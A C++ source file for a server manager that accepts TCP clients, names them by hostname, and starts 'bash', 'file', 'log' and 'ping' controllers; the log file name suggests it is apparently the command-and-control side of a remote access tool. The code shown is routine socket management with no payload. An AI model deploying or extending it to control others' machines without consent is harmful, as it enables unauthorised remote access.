#include "ServerManager.hpp"
#include "ServerPingController.hpp"
#include "ServerFileController.hpp"
#include <iostream>
#include <thread>
#include <chrono>
#include <cstdlib>
#include <sstream>
#include <fstream>

namespace Server {

// ============================================================================
// Singleton
// ============================================================================

std::shared_ptr<ServerManager> ServerManager::getInstance() {
    if (!ServerManager::instance) {
        std::lock_guard<std::mutex> lock(ServerManager::initMutex);
        if (!ServerManager::instance) ServerManager::instance.reset(new ServerManager());
    }
    return ServerManager::instance;
}

ServerManager::ServerManager() = default;

ServerManager::~ServerManager() {
    stop();
    
    std::lock_guard<std::mutex> lock(mtx_);
    cleanupResources();
}

// ============================================================================
// Lifecycle
// ============================================================================

bool ServerManager::start(unsigned short port) {
    std::lock_guard<std::mutex> lock(mtx_);
    
    if (running_) {
        std::cerr << "Error: Server is already running" << std::endl;
        return false;
    }
    
    // Initialize listener socket
    listener_ = std::make_unique<Utils::TCPSocket>();
    if (!listener_->bind(port)) {
        std::cerr << "Failed to bind listener socket to port " << port << std::endl;
        std::cerr << "Possible causes:" << std::endl;
        std::cerr << "  - Port already in use (check with: lsof -i :" << port << ")" << std::endl;
        std::cerr << "  - Socket in TIME_WAIT state (wait ~60s or run: sudo fuser -k " << port << "/tcp)" << std::endl;
        std::cerr << "  - Insufficient permissions (ports < 1024 need root)" << std::endl;
        std::cerr << "  - Firewall blocking the port" << std::endl;
        listener_.reset();
        return false;
    }
    
    port_ = port;
    running_ = true;
    std::cout << "Server started successfully on port " << port << std::endl;
    
    // Initialize system controllers
    initializeControllers();
    
    return true;
}


void ServerManager::stop() {
    std::lock_guard<std::mutex> lock(mtx_);
    
    if (!running_) return;
    
    running_ = false;
    
    // Close listener socket
    if (listener_) {
        listener_->close();
        listener_.reset();
    }
    
    port_ = 0;
}

bool ServerManager::isRunning() const {
    
    std::lock_guard<std::mutex> lock(mtx_);
    return running_;
}

int ServerManager::run(unsigned short port) {
    if (!start(port)) {
        return 1;
    }
    
    int unknownCount = 0;
    Utils::TCPSocket* listenerPtr = nullptr;
    
    {
        std::lock_guard<std::mutex> lock(mtx_);
        listenerPtr = listener_.get();
    }
    
    // Main server loop: accept and handle client connections
    while (isRunning()) {
        if (!listenerPtr) break;
        
        auto client = listenerPtr->accept();
        if (!client) {
            std::this_thread::sleep_for(std::chrono::milliseconds(100));
            continue;
        }
        
        handleNewClientConnection(std::move(client), unknownCount);
    }
    
    return 0;
}

// ============================================================================
// Client Management
// ============================================================================

bool ServerManager::addClient(const std::string &deviceName, std::unique_ptr<Utils::TCPSocket> socket) {
    std::lock_guard<std::mutex> lock(mtx_);
    
    // Validate input
    if (!socket) {
        pushLog("Failed to add client " + deviceName + ": null socket");
        return false;
    }
    
    if (clients_.find(deviceName) != clients_.end()) {
        pushLog("Failed to add client " + deviceName + ": name already exists");
        return false;
    }
    
    // Register client and create controller
    Utils::TCPSocket *sockPtr = socket.get();
    std::string clientIP = socket->getRemoteAddress();
    
    clients_[deviceName] = std::move(socket);
    clientIPs_[deviceName] = clientIP;
    clientControllers_[deviceName] = std::make_unique<ServerController>(this, deviceName, sockPtr);
    
    // Start controller
    if (auto it = clientControllers_.find(deviceName); it != clientControllers_.end()) {
        it->second->start();
    }
    
    pushLog("Client connected: " + deviceName + " (" + clientIP + ")");
    return true;
}

bool ServerManager::removeClient(const std::string &deviceName) {
    std::lock_guard<std::mutex> lock(mtx_);
    
    auto it = clients_.find(deviceName);
    if (it == clients_.end()) {
        return false;
    }
    
    // Stop controller first to ensure background threads are joined
    auto cit = clientControllers_.find(deviceName);
    if (cit != clientControllers_.end()) {
        if (cit->second) {
            cit->second->stop();
        }
        clientControllers_.erase(cit);
    }
    
    // Close and remove socket
    if (it->second) {
        it->second->close();
    }
    clients_.erase(it);
    
    // Remove IP mapping
    clientIPs_.erase(deviceName);
    
    pushLog("Client removed: " + deviceName);
    return true;
}

Utils::TCPSocket *ServerManager::getClient(const std::string &deviceName) {
    std::lock_guard<std::mutex> lock(mtx_);
    
    auto it = clients_.find(deviceName);
    if (it == clients_.end()) {
        return nullptr;
    }
    
    return it->second.get();
}

// ============================================================================
// Controller Access
// ============================================================================

IController *ServerManager::getController(const std::string &deviceName) {
    std::lock_guard<std::mutex> lock(mtx_);
    auto it = clientControllers_.find(deviceName);
    if (it == clientControllers_.end()) return nullptr;
    return it->second.get();
}

ServerController *ServerManager::getServerController(const std::string &deviceName) {
    std::lock_guard<std::mutex> lock(mtx_);
    auto it = clientControllers_.find(deviceName);
    if (it == clientControllers_.end()) return nullptr;
    return it->second.get();
}

IController *ServerManager::getControllerByHandle(const std::string &handle) {
    // First check system controllers
    IController* ctrl = getSystemController(handle);
    if (ctrl) return ctrl;
    
    // Then check client controllers by device name
    return getController(handle);
}

IController *ServerManager::getSystemController(const std::string &handle) {
    std::lock_guard<std::mutex> lock(mtx_);
    auto it = controllers_.find(handle);
    return (it != controllers_.end()) ? it->second.get() : nullptr;
}

// ============================================================================
// Logging
// ============================================================================

void ServerManager::pushLog(const std::string &msg) {
    std::lock_guard<std::mutex> lock(logMtx_);
    logs_.push(msg);
    
    if (logPath_.empty()) logPath_ = "/tmp/rat_server.log";
    try {
        std::ofstream ofs(logPath_, std::ios::app);
        if (ofs) ofs << msg << std::endl;
    } catch (...) {}
}

bool ServerManager::popLog(std::string &out) {
    std::lock_guard<std::mutex> lock(logMtx_);
    if (logs_.empty()) return false;
    out = std::move(logs_.front());
    logs_.pop();
    return true;
}

// ============================================================================
// Client Info
// ============================================================================

std::vector<std::string> ServerManager::listClients() {
    std::lock_guard<std::mutex> lock(mtx_);
    std::vector<std::string> names;
    for (auto &p : clients_) names.push_back(p.first);
    return names;
}

std::string ServerManager::getClientIP(const std::string &name) {
    std::lock_guard<std::mutex> lock(mtx_);
    auto it = clientIPs_.find(name);
    return (it != clientIPs_.end()) ? it->second : "unknown";
}

bool ServerManager::hasClient(const std::string &name) {
    std::lock_guard<std::mutex> lock(mtx_);
    return clients_.find(name) != clients_.end();
}

// ============================================================================
// Helper Functions (Private)
// ============================================================================

void ServerManager::initializeControllers() {
    // Note: mtx_ must be locked before calling this function
    
    // Create and start log controller
    controllers_.emplace("log", std::make_unique<ServerLogController>(this));
    if (auto it = controllers_.find("log"); it != controllers_.end()) {
        it->second->start();
    }
    
    // Create and start bash/command controller
    controllers_.emplace("bash", std::make_unique<ServerCommandController>(this));
    if (auto it = controllers_.find("bash"); it != controllers_.end()) {
        it->second->start();
    }
    
    // Create and start file controller
    controllers_.emplace("file", std::make_unique<ServerFileController>(this));
    if (auto it = controllers_.find("file"); it != controllers_.end()) {
        it->second->start();
    }
    
    // Create and start ping controller (UDP discovery)
    auto pingController = std::make_unique<ServerPingController>(this);
    if (pingController->startUdpResponder(port_)) {
        controllers_.emplace("ping", std::move(pingController));
    } else {
        std::cerr << "Warning: Failed to start UDP ping responder" << std::endl;
    }
}

void ServerManager::cleanupResources() {
    // Note: mtx_ must be locked before calling this function
    
    // Stop all system controllers
    for (auto &p : controllers_) {
        if (p.second) {
            p.second->stop();
        }
    }
    controllers_.clear();
    
    // Stop all client controllers
    for (auto &p : clientControllers_) {
        if (p.second) {
            p.second->stop();
        }
    }
    clientControllers_.clear();
    
    // Close all client connections
    for (auto &p : clients_) {
        if (p.second) {
            p.second->close();
        }
    }
    clients_.clear();
    clientIPs_.clear();
}

std::string ServerManager::generateUniqueDeviceName(const std::string& base, int& counter) {
    // Note: mtx_ must be locked before calling this function
    
    std::string name = base;
    while (clients_.find(name) != clients_.end()) {
        name = base + "_" + std::to_string(++counter);
    }
    return name;
}

void ServerManager::handleNewClientConnection(std::unique_ptr<Utils::TCPSocket> client, int& unknownCount) {
    if (!client) return;
    
    // Set blocking mode for initial handshake
    client->setBlocking(true);
    
    // Try to receive hostname from client
    std::string deviceName;
    std::string jsonStr;
    if (client->receive(jsonStr)) {
        try {
            nlohmann::json initMsg = nlohmann::json::parse(jsonStr);
            if (initMsg.contains("hostname") && initMsg["hostname"].is_string()) {
                deviceName = initMsg["hostname"].get<std::string>();
            }
        } catch (const std::exception& e) {
            pushLog("Failed to parse client init message: " + std::string(e.what()));
        }
    }
    
    // Generate device name if not provided
    if (deviceName.empty()) {
        deviceName = "unknown" + std::to_string(++unknownCount);
    }
    
    // Ensure unique device name
    {
        std::lock_guard<std::mutex> lock(mtx_);
        deviceName = generateUniqueDeviceName(deviceName, unknownCount);
    }
    
    // Register client and create controller
    Utils::TCPSocket *clientPtr = client.get();
    std::string clientIP = client->getRemoteAddress();
    
    {
        std::lock_guard<std::mutex> lock(mtx_);
        clients_[deviceName] = std::move(client);
        clientIPs_[deviceName] = clientIP;
        clientControllers_[deviceName] = std::make_unique<ServerController>(this, deviceName, clientPtr);
        
        if (auto it = clientControllers_.find(deviceName); it != clientControllers_.end()) {
            it->second->start();
        }
    }
    
    pushLog("New client connected: " + deviceName + " (" + clientIP + ")");
}

} 
